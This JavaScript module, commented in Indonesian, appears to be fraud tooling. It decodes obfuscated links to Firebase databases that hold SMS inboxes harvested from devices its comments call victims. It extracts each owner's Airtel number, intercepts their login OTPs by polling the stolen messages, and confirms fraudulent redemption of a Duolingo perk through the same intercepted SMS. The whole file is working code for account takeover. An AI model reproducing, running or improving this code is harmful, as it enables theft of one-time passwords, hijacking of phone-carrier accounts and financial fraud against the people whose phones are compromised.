import axios from 'axios';
import { sleep, C } from './utils.mjs';

const OTP_TIMEOUT = 120000; // 2 menit - sesuai Grizzly asli & gemini-jio
const POLL_INTERVAL = 1000; // 1 detik - lebih responsif seperti gemini-jio

const NUMBER_PATTERNS = [
  /(?:your\s+)?airtel\s+(?:mobile|no\.?|number)[.:=,\s]*\+?(?:91)?([6-9]\d{9})/i,
  /(?:airtel|mobile|no[.]?|number)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})/i,
  /(?:recharge|pack|plan|account)\s+(?:for\s+)?(?:[+]91)?([6-9]\d{9})/i,
  /(?:otp|code|password)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})/i,
];

const OTP_WORD_PATTERN = /otp|one[-]?time password|verification code|airtel/i;
// Airtel login OTP bisa 4 ATAU 6 digit (dari data panel: "2484 is your OTP",
// "513385 is your OTP", dll). Terima 4-6 digit, pisahkan dari nomor telepon.
const OTP_PATTERN = /(?<!\d)(\d{4,6})(?!\d)/;

// Pola body SMS incoming dari operator yang MENYEBUT nomor Airtel pemilik SIM
const SIM_BODY_PATTERNS = [
  /(?:your\s+)?airtel\s+(?:mobile|no\.?|number)[.:=,\s]*\+?(?:91)?([6-9]\d{9})/i,
];

export function parsePanelInfo(url, defaultKey) {
  if (typeof url === 'string' && url.includes("?s=")) {
    try {
      const sParam = url.split("?s=")[1].split("&")[0];
      try {
        let b64 = sParam + "=".repeat((-sParam.length % 4 + 4) % 4);
        const binData = Buffer.from(b64, 'base64');
        const K = "ZXKAIv1_Xk9mP2wN7qL4vR6jH3cF8yT1ZbE5sA09";
        const dec = Buffer.alloc(binData.length);
        for (let i = 0; i < binData.length; i++) {
          dec[i] = binData[i] ^ K.charCodeAt(i % K.length);
        }
        const obj = JSON.parse(dec.toString('utf-8'));
        if (obj && obj.u && obj.k) return [obj.u.trim(), obj.k.trim()];
      } catch (e) { }
      let b64Part = sParam + "=".repeat((-sParam.length % 4 + 4) % 4);
      const decoded = Buffer.from(b64Part, 'base64').toString('utf-8');
      if (decoded.includes("|||")) return [decoded.split("|||")[0].trim(), defaultKey];
      return [decoded.trim(), defaultKey];
    } catch (e) { }
  }
  if (typeof url === 'string' && url.includes("?m=")) {
    try {
      const mParam = url.split("?m=")[1].split("&")[0];
      let b64 = mParam.replace(/-/g, '+').replace(/_/g, '/');
      b64 += "=".repeat((-b64.length % 4 + 4) % 4);
      const decoded = Buffer.from(b64, 'base64').toString('utf-8');
      const items = JSON.parse(decoded);
      if (Array.isArray(items) && items.length > 0) return [items, defaultKey];
    } catch (e) { }
  }
  return [url, defaultKey];
}

export async function firebaseGet(session, baseUrl, key, endpointPath, params = {}) {
  const query = { auth: key, ...params };
  const res = await session.get(`${baseUrl}/${endpointPath.replace(/^\/+|\/+$/g, '')}.json`, {
    params: query, timeout: 10000
  });
  return res.data;
}

export async function latestMessages(session, baseUrl, key, deviceId, limit) {
  const data = await firebaseGet(session, baseUrl, key, `messages/${deviceId}`, {
    orderBy: '"$key"', limitToLast: Math.max(1, limit)
  });
  if (!data || typeof data !== 'object') return {};
  const result = {};
  for (const [name, value] of Object.entries(data)) {
    if (value && typeof value === 'object') result[name] = value;
  }
  return result;
}


function normalizeMobile(value) {
  const digits = String(value || '').replace(/\D/g, '');
  let norm = digits;
  if (norm.length > 10 && norm.startsWith('91')) norm = norm.slice(-10);
  return /^[6-9]\d{9}$/.test(norm) ? norm : null;
}

export function numberCandidates(messages = {}, clientData = {}) {
  // Sumber nomor SIM device yang valid (pola komprehensif seperti gemini-jio):
  // 1. clientData.phoneNumber / mobNo / phone / mobile - nomor SIM tersimpan di record korban
  // 2. item.simInfo.phoneNumber                       - nomor SIM terdeteksi OS
  // 3. item.phoneNumber                               - field nomor pada SMS
  // 4. Body SMS incoming/outgoing operator ("Airtel No.", recharge, account number)
  const phoneNumbers = new Set();
  const simFromBody = new Set();
  const numBodyTime = new Map();
  let airtelOtpIncoming = false;
  let lastOtpAirtelTime = 0;
  let lastActivityTime = 0;

  // 1. Ambil nomor SIM langsung dari clientData
  if (clientData && typeof clientData === 'object') {
    const directFields = [
      clientData.phoneNumber,
      clientData.mobNo,
      clientData.phone,
      clientData.mobile,
      clientData.simInfo && (clientData.simInfo.phoneNumber || clientData.simInfo.number)
    ];
    for (const f of directFields) {
      const norm = normalizeMobile(f);
      if (norm) phoneNumbers.add(norm);
    }
  }

  // 2. Ekstrak dari riwayat SMS
  for (const [msgKey, item] of Object.entries(messages)) {
    if (!item) continue;
    // simInfo.phoneNumber = nomor SIM card yang terdeteksi oleh OS
    if (item.simInfo && typeof item.simInfo === 'object') {
      const mobile = normalizeMobile(item.simInfo.phoneNumber || item.simInfo.number);
      if (mobile) phoneNumbers.add(mobile);
    }
    // phoneNumber = field nomor di SMS panel Firebase
    const directPhone = normalizeMobile(item.phoneNumber);
    if (directPhone) phoneNumbers.add(directPhone);

    const body = String(item.message || '');
    const isIncoming = String(item.type || '').toLowerCase().includes('in') || item.type === 1 || item.type === '1';
    const msgTs = parseMessageTimestamp(msgKey, item);
    if (msgTs > 0 && msgTs > lastActivityTime) lastActivityTime = msgTs;

    // Deteksi: device ini menerima SMS OTP Airtel incoming -> pasti SIM Airtel aktif
    if (isIncoming && /airtel/i.test(body) && /\botp\b|verification/i.test(body)) {
      airtelOtpIncoming = true;
      if (msgTs > lastOtpAirtelTime) lastOtpAirtelTime = msgTs;
    }

    // Ekstrak nomor dari body SMS operator / recharge
    if (body.length > 0) {
      for (const pattern of NUMBER_PATTERNS) {
        const m = body.match(pattern);
        if (m && m[1]) {
          const norm = normalizeMobile(m[1]);
          if (!norm) continue;
          simFromBody.add(norm);
          const prev = numBodyTime.get(norm) || 0;
          if (msgTs > prev) numBodyTime.set(norm, msgTs);
        }
      }
    }
  }

  // Gabungkan: prioritas phoneNumbers (field langsung) lalu simFromBody (body SMS)
  const all = new Set([...phoneNumbers, ...simFromBody]);
  const simSource = phoneNumbers.size > 0
    ? (simFromBody.size > 0 ? 'mixed' : 'direct')
    : (simFromBody.size > 0 ? 'body-sms' : 'none');

  return {
    numbers: new Set(),
    simNumbers: all,
    airtelOtpIncoming,
    simSource,
    lastOtpAirtelTime,
    lastActivityTime,
    numBodyTime: Object.fromEntries(numBodyTime),
  };
}

function messageOrder(key, item) {
  for (const val of [item.id, item.timestamp, key]) {
    try {
      const n = parseInt(val, 10);
      if (!isNaN(n)) return n;
    } catch (e) { }
  }
  return 0;
}

function detectOperatorFromSms(messages) {
  let airtelScore = 0;
  let jioScore = 0;
  let viScore = 0;
  let bsnlScore = 0;

  for (const item of Object.values(messages)) {
    if (!item) continue;
    const body = String(item.message || '').toLowerCase();
    const sender = String(item.sender || '').toLowerCase();

    // TRAI format header operator India (misal AX-, AR-, AM-, AD-AIRTEL, JX-, VM-, dll)
    if (/^(a[a-z]-|airtel)/i.test(sender) || /airtel/i.test(sender)) airtelScore += 4;
    if (/^(j[a-z]-|jio)/i.test(sender) || /jio/i.test(sender)) jioScore += 4;
    if (/^(v[a-z]-|vi-|idea|vodafone)/i.test(sender) || /vi |vodafone|idea/i.test(sender)) viScore += 4;
    if (/^(b[a-z]-|bsnl)/i.test(sender) || /bsnl/i.test(sender)) bsnlScore += 4;

    if (/\bairtel\b/.test(body)) airtelScore += 2;
    if (/\bjio\b/.test(body)) jioScore += 2;
    if (/\bvi\b|\bvodafone\b|\bidea\b/.test(body)) viScore += 2;
    if (/\bbsnl\b/.test(body)) bsnlScore += 2;
  }

  const max = Math.max(airtelScore, jioScore, viScore, bsnlScore);
  if (max === 0) return 'unknown';
  if (airtelScore === max) return 'airtel';
  if (jioScore === max) return 'jio';
  if (viScore === max) return 'vi';
  if (bsnlScore === max) return 'bsnl';
  return 'unknown';
}

async function scanSingleDatabase(session, url, key, scanLimit) {
  // Ambil daftar clients online (status === true) seperti gemini-jio
  const clients = await firebaseGet(session, url, key, 'clients', {});
  const onlineDevices = new Map();
  if (clients && typeof clients === 'object') {
    for (const [deviceId, data] of Object.entries(clients)) {
      if (data && typeof data === 'object' && data.status === true) {
        onlineDevices.set(deviceId, data);
      }
    }
  }

  // Fallback: jika /clients/ online kosong, gunakan semua clients atau /devices/
  if (onlineDevices.size === 0) {
    if (clients && typeof clients === 'object' && Object.keys(clients).length > 0) {
      for (const [deviceId, data] of Object.entries(clients)) {
        if (data && typeof data === 'object') onlineDevices.set(deviceId, data);
      }
    } else {
      const devices = await firebaseGet(session, url, key, 'devices', {});
      if (devices && typeof devices === 'object') {
        for (const [deviceId, data] of Object.entries(devices)) {
          if (data && typeof data === 'object') onlineDevices.set(deviceId, data);
        }
      }
    }
  }

  if (onlineDevices.size === 0) return [];

  const deviceResults = await Promise.allSettled(
    Array.from(onlineDevices.entries()).map(async ([deviceId, clientData]) => {
      const msgs = await latestMessages(session, url, key, deviceId, scanLimit);
      const numResult = numberCandidates(msgs, clientData);
      const nums = numResult.numbers || new Set();
      const sims = numResult.simNumbers || new Set();
      const airtelOtpIncoming = !!numResult.airtelOtpIncoming;
      const simSource = numResult.simSource || 'none';
      const lastOtpAirtelTime = numResult.lastOtpAirtelTime || 0;
      const lastActivityTime = numResult.lastActivityTime || 0;
      const numBodyTime = numResult.numBodyTime || {};

      // Device valid jika punya nomor SIM terdeteksi
      if (sims.size > 0) {
        const smsOperator = detectOperatorFromSms(msgs);
        return {
          baseUrl: url, key, deviceId,
          numbers: nums, simNumbers: sims, smsOperator,
          airtelOtpIncoming, simSource,
          lastOtpAirtelTime, lastActivityTime, numBodyTime,
        };
      }
      return null;
    })
  );
  return deviceResults
    .filter(r => r.status === 'fulfilled' && r.value)
    .map(r => r.value);
}

export async function collectDevicesAndNumbers(panels, scanLimit = 50) {
  const session = axios.create();
  session.defaults.headers['Accept'] = 'application/json';
  session.defaults.headers['Cache-Control'] = 'no-cache';

  // Flatten semua panel menjadi list task {url, key} terdeduplikasi
  const taskMap = new Map();
  for (const panel of panels) {
    const [url, defaultKey] = Array.isArray(panel) ? panel : [panel, 'Gagw'];
    const [parsedUrlOrItems, parsedKey] = parsePanelInfo(url, defaultKey);
    if (Array.isArray(parsedUrlOrItems)) {
      for (const item of parsedUrlOrItems) {
        if (item && item.url) {
          const normUrl = item.url.trim().replace(/\/+$/, '');
          const key = (item.key || 'Gagw').trim();
          if (!taskMap.has(normUrl) || (taskMap.get(normUrl).key === 'Gagw' && key !== 'Gagw')) {
            taskMap.set(normUrl, { url: item.url, key });
          }
        }
      }
    } else if (parsedUrlOrItems) {
      const normUrl = parsedUrlOrItems.trim().replace(/\/+$/, '');
      const key = (parsedKey || 'Gagw').trim();
      if (!taskMap.has(normUrl) || (taskMap.get(normUrl).key === 'Gagw' && key !== 'Gagw')) {
        taskMap.set(normUrl, { url: parsedUrlOrItems, key });
      }
    }
  }

  const tasks = Array.from(taskMap.values());
  console.log(`  Total database Firebase unik: ${tasks.length} (dari ${panels.length} panel link)`);

  // Scan semua database secara paralel
  let done = 0;
  const allResults = await Promise.allSettled(
    tasks.map(async (task) => {
      try {
        const res = await scanSingleDatabase(session, task.url, task.key, scanLimit);
        done++;
        process.stdout.write(`\r  Scanning... ${done}/${tasks.length} selesai`);
        return res;
      } catch (e) {
        done++;
        process.stdout.write(`\r  Scanning... ${done}/${tasks.length} selesai`);
        return [];
      }
    })
  );

  console.log(''); // newline setelah progress

  const results = [];
  for (const r of allResults) {
    if (r.status === 'fulfilled' && Array.isArray(r.value)) {
      results.push(...r.value);
    }
  }
  return results;
}

// Parse timestamp dari message item dengan multiple fallback (pola gemini-jio)
function parseMessageTimestamp(messageKey, item) {
  // 1. item.timestamp (epoch ms atau seconds)
  if (item.timestamp) {
    let ts = typeof item.timestamp === 'number' ? item.timestamp : Number(item.timestamp);
    if (ts > 0 && ts < 1e12) ts *= 1000; // konversi seconds ke ms
    if (ts > 0 && !isNaN(ts)) return ts;
  }
  // 2. item.dateTime (string format IST atau ISO)
  if (item.dateTime) {
    const s = String(item.dateTime).trim();
    // Coba format DD-MM-YYYY | HH:MM am/pm (IST dari FireX panel)
    const m = s.match(/(\d{2})-(\d{2})-(\d{4})\s*\|?\s*(\d{1,2}):(\d{2})\s*(am|pm)?/i);
    if (m) {
      let [, dd, mm, yyyy, hh, min, ampm] = m;
      let h = parseInt(hh, 10);
      if (ampm) {
        const p = ampm.toLowerCase() === 'pm';
        if (p && h < 12) h += 12;
        if (!p && h === 12) h = 0;
      }
      // IST = UTC+5:30, konversi ke epoch UTC
      const IST_OFFSET_MS = 5 * 3600000 + 30 * 60000;
      const utcFake = Date.UTC(parseInt(yyyy), parseInt(mm) - 1, parseInt(dd), h, parseInt(min));
      const result = utcFake - IST_OFFSET_MS;
      if (!isNaN(result)) return result;
    }
    // Fallback: parse sebagai Date string biasa
    const parsed = new Date(s).getTime();
    if (!isNaN(parsed)) return parsed;
  }
  // 3. item.date
  if (item.date) {
    const parsed = new Date(item.date).getTime();
    if (!isNaN(parsed)) return parsed;
  }
  // 4. Fallback ke messageKey jika berupa epoch
  const keyNum = Number(messageKey);
  if (keyNum > 1e12) return keyNum;
  if (keyNum > 1e9) return keyNum * 1000;
  return 0;
}

export async function waitForOtp(baseUrl, key, deviceId, knownKeys, targetNumber, otpRequestTime = 0, onResend = null) {
  const session = axios.create();
  session.defaults.headers['Accept'] = 'application/json';
  const used = knownKeys instanceof Set ? knownKeys : new Set(knownKeys || []);
  const triedOtps = new Set(); // Cegah retry OTP yang sudah gagal (pola gemini-jio)
  const deadline = Date.now() + OTP_TIMEOUT;
  const startTime = otpRequestTime || Date.now();
  // Auto-resend DIHAPUS: terlalu agresif menyebabkan rate-limit Airtel.
  // Gunakan pendekatan Grizzly: tunggu penuh tanpa resend.
  // Hanya lakukan 1x resend di pertengahan waktu jika belum ada SMS sama sekali.
  let hasResent = false;
  let totalMessagesScanned = 0;
  let totalNewSms = 0;
  let pollCount = 0;
  const verboseDebug = process.env.DEBUG_OTP === 'true';

  if (verboseDebug) {
    console.log("    [DEBUG-OTP] waitForOtp started, target=" + targetNumber + " startTime=" + startTime);
  }

  while (Date.now() < deadline) {
    const now = Date.now();
    const elapsedSec = Math.floor((now - startTime) / 1000);

    // Single resend di detik ke-45 jika BELUM ada SMS masuk sama sekali (pola Grizzly)
    if (onResend && !hasResent && elapsedSec >= 45 && totalNewSms === 0) {
      console.log("    " + C.yellow + "[RESEND] 45 detik tanpa SMS, kirim ulang 1x..." + C.reset);
      try {
        await onResend();
        hasResent = true;
      } catch (e) {
        console.log("    " + C.red + "[RESEND] Gagal resend: " + e.message + C.reset);
      }
    }

    pollCount++;
    try {
      const messages = await latestMessages(session, baseUrl, key, deviceId, 50);
      const candidates = [];
      let newMsgCount = 0;

      for (const [messageKey, item] of Object.entries(messages)) {
        if (used.has(messageKey)) continue;
        used.add(messageKey);
        newMsgCount++;
        totalMessagesScanned++;

        const body = String(item.message || '');

        // Filter waktu: skip pesan yang terlalu lama (grace period 120 detik, pola gemini-jio)
        const msgTime = parseMessageTimestamp(messageKey, item);
        if (msgTime > 0 && msgTime < (startTime - 120000)) continue;

        // Verifikasi bahwa SMS ini mengandung kata kunci OTP/Airtel
        // agar tidak salah tangkap kode numerik lain sebagai OTP
        const lowerBody = body.toLowerCase();
        const isOtpMessage = /otp|one[- ]?time|verification|airtel|code|password|login/i.test(lowerBody);
        if (!isOtpMessage) continue;

        // Ekstrak kandidat OTP (tepat 6 digit) dari body SMS
        const matches = [...body.matchAll(new RegExp(OTP_PATTERN.source, 'g'))];
        for (const m of matches) {
          if (!triedOtps.has(m[1])) {
            triedOtps.add(m[1]);
            candidates.push({
              order: messageOrder(messageKey, item),
              otp: m[1]
            });
          }
        }
      }

      if (newMsgCount > 0) {
        totalNewSms += newMsgCount;
      }

      if (verboseDebug && newMsgCount > 0) {
        console.log("    [POLL #" + pollCount + "] deviceId:" + deviceId + " new:" + newMsgCount + " candidates:" + candidates.length + " elapsed:" + elapsedSec + "s");
      }

      // Sort berdasarkan messageOrder descending (pesan terbaru dulu, pola gemini-jio)
      candidates.sort((a, b) => b.order - a.order);

      // Kembalikan OTP terbaik (yang paling baru)
      if (candidates.length > 0) {
        const best = candidates[0];
        console.log("    " + C.green + "OTP ditemukan: " + best.otp + " (setelah " + elapsedSec + " detik)" + C.reset);
        return best.otp;
      }
    } catch (e) {
      if (verboseDebug) {
        console.log("    [DEBUG-OTP] Poll error: " + e.message);
      }
    }
    await sleep(POLL_INTERVAL);
  }

  console.log("    " + C.dim + "[TIMEOUT] dipindai: " + totalMessagesScanned + " pesan, SMS baru: " + totalNewSms + ", dicoba: " + triedOtps.size + " OTP unik" + C.reset);
  return null;
}

// ============================================
// DETEKSI KONFIRMASI KLAIM VIA SMS
// Airtel mengirim SMS "Your Rs. 3120 Super Duolingo perk is now unlocked!"
// setelah klaim berhasil di sisi server. Ini sinyal paling reliable karena
// popup redeem di web sering about:blank / diblokir.
// ============================================
const CLAIM_SMS_PATTERNS = [
  /super\s*duolingo\s+perk\s+is\s+now\s+unlocked/i,
  /duolingo.*unlocked/i,
  /Rs\.?\s*3120\s*Super\s*Duolingo/i,
];

export async function waitForClaimSms(baseUrl, key, deviceId, claimTime, timeoutMs = 90000) {
  const session = axios.create();
  session.defaults.headers['Accept'] = 'application/json';
  const deadline = Date.now() + timeoutMs;
  const startTime = claimTime || Date.now();

  while (Date.now() < deadline) {
    try {
      // Scan 400 pesan terakhir (bukan 50) — inbox device bisa sibuk & SMS
      // unlock bisa terdorong keluar dari jendela 50 pesan terakhir.
      const messages = await latestMessages(session, baseUrl, key, deviceId, 400);
      for (const [messageKey, item] of Object.entries(messages)) {
        if (!item) continue;
        const body = String(item.message || '');
        const msgTime = parseMessageTimestamp(messageKey, item);
        // Hanya SMS yang masuk SETELAH kita klik claim (grace 120s)
        if (msgTime > 0 && msgTime < (startTime - 120000)) continue;

        for (const pat of CLAIM_SMS_PATTERNS) {
          if (pat.test(body)) {
            return { ok: true, body, messageKey, msgTime };
          }
        }
      }
    } catch (e) {}
    await sleep(POLL_INTERVAL);
  }
  return null;
}

// Cek apakah SMS unlock Duolingo SUDAH ADA sebelum kita klik claim.
// Digunakan untuk pre-claim check: kalau sudah ada unlock SMS berusia
// lebih dari maxAgeMs (default 2 jam), subscription sudah aktif sebelumnya
// dan klik claim tidak perlu dilakukan (hemat waktu, hindari duplikasi).
// Mengembalikan { body, msgTime, ageHours } atau null jika tidak ada.
export async function getPriorUnlockSms(baseUrl, key, deviceId, maxAgeMs = 2 * 60 * 60 * 1000) {
  const session = axios.create();
  session.defaults.headers['Accept'] = 'application/json';
  try {
    const messages = await latestMessages(session, baseUrl, key, deviceId, 400);
    let best = null;
    for (const [messageKey, item] of Object.entries(messages)) {
      if (!item) continue;
      const body = String(item.message || '');
      for (const pat of CLAIM_SMS_PATTERNS) {
        if (pat.test(body)) {
          const msgTime = parseMessageTimestamp(messageKey, item);
          if (msgTime > 0) {
            const age = Date.now() - msgTime;
            if (age >= maxAgeMs && (!best || msgTime > best.msgTime)) {
              best = { body, msgTime, ageHours: Math.round(age / 3600000) };
            }
          }
          break;
        }
      }
    }
    return best;
  } catch (e) {
    return null;
  }
}
